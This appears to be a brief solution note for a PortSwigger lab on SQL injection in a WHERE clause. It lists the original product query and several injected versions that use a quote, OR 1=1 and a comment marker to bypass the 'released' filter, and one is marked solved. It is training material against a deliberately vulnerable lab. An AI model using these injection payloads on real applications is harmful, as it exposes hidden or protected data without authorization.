--Name:SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
--URL:https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
--Level:Easy Time: 5 min
---------------------------------------------------------------------------------
SELECT * FROM products WHERE category = 'Gifts' AND released = 1

SELECT * FROM products WHERE category = 'Gifts'or1=1-- AND released = 1

SELECT * FROM products WHERE category = 'Pets' AND released = 0-- AND released = 1      check

SELECT * FROM products WHERE category = 'Pets' OR 1=1-- AND released = 1      Solved
